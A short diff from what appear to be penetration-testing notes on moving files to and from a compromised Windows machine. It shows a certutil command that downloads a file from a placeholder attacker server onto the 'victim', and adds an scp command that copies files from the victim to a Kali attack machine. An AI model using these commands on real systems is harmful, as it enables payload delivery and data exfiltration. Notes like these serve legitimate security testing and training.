@@ -118,4 +118,7 @@ Once the file has been generated, we can replace the executable on the windows s
 In Windows VIctim Download File:
         certutil -urlcache -f http://x.x.x.x:8080/FileName  FileName
 
+Simple SCP from Windows Victim Machine to ATTAK Machine Kali:
+    scp FileNAme <Username>@<KALI IP>:/FilePAth/ .
+
 
